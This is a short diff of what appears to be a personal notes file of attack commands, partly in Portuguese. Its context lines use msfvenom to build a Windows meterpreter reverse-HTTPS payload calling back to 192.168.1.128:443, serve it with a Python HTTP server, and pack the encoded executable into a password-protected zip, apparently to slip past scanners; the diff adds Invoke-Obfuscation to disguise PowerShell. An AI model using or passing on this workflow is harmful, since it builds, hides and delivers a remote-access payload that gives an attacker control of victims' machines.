@@ -6,6 +6,10 @@ msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -f p
 
 python3 -m http.server 8080
 
+Import-Module ./Invoke-Obfuscation.psd1
+Invoke-Obfuscation
+
+
 http://192.168.1.128:8080/payload_protegido.zip
 
 zip --password SuaSenhaForte payload_protegido.zip payload_encoded.exe
